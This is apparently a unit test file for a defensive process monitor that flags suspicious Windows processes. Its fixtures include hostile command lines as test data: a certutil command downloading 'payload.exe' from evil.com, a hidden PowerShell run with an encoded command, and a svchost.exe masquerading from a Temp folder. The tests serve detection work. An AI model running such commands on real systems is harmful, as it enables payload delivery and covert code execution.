"""Unit tests for Phase 2 Real-Time Process Monitor."""

from app.database.models import RiskLevel
from app.monitoring.process_monitor import ProcessMonitor


def test_inspect_benign_process() -> None:
    monitor = ProcessMonitor()
    fake_proc = {
        "pid": 1234,
        "name": "notepad.exe",
        "ppid": 5678,
        "exe": "C:\\Windows\\notepad.exe",
        "cmdline": ["C:\\Windows\\notepad.exe", "file.txt"],
        "memory_info": None,
        "cpu_percent": 0.5,
        "username": "User",
        "create_time": 1000.0,
        "status": "running",
    }

    info = monitor.inspect_process(fake_proc)
    assert info.pid == 1234
    assert not info.is_suspicious
    assert info.risk_level == RiskLevel.SAFE.value


def test_detect_suspicious_parent_child_spawn() -> None:
    monitor = ProcessMonitor()
    fake_proc = {
        "pid": 9999,
        "name": "powershell.exe",
        "ppid": 1111,
        "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "cmdline": ["powershell.exe", "-nop"],
    }

    info = monitor.inspect_process(fake_proc)
    assert info.pid == 9999

    # Test LOLBin powershell hidden
    fake_hidden = {
        "pid": 8888,
        "name": "powershell.exe",
        "cmdline": ["powershell.exe", "-w", "hidden", "-enc", "SQBFAFgA..."],
    }
    info_hidden = monitor.inspect_process(fake_hidden)
    assert info_hidden.is_suspicious
    assert info_hidden.risk_level in (RiskLevel.HIGH.value, RiskLevel.CRITICAL.value)
    assert any("PowerShell Abuse" in r for r in info_hidden.reasons)


def test_detect_certutil_abuse() -> None:
    monitor = ProcessMonitor()
    fake_proc = {
        "pid": 7777,
        "name": "certutil.exe",
        "cmdline": ["certutil", "-urlcache", "-split", "-f", "http://evil.com/payload.exe"],
    }
    info = monitor.inspect_process(fake_proc)
    assert info.is_suspicious
    assert any("CertUtil Ingress" in r for r in info.reasons)


def test_detect_process_masquerading() -> None:
    monitor = ProcessMonitor()
    fake_proc = {
        "pid": 6666,
        "name": "svchost.exe",
        "exe": "C:\\Users\\Attacker\\AppData\\Local\\Temp\\svchost.exe",
        "cmdline": ["svchost.exe"],
    }
    info = monitor.inspect_process(fake_proc)
    assert info.is_suspicious
    assert info.risk_level == RiskLevel.CRITICAL.value
    assert any("Masquerading Binary" in r for r in info.reasons)
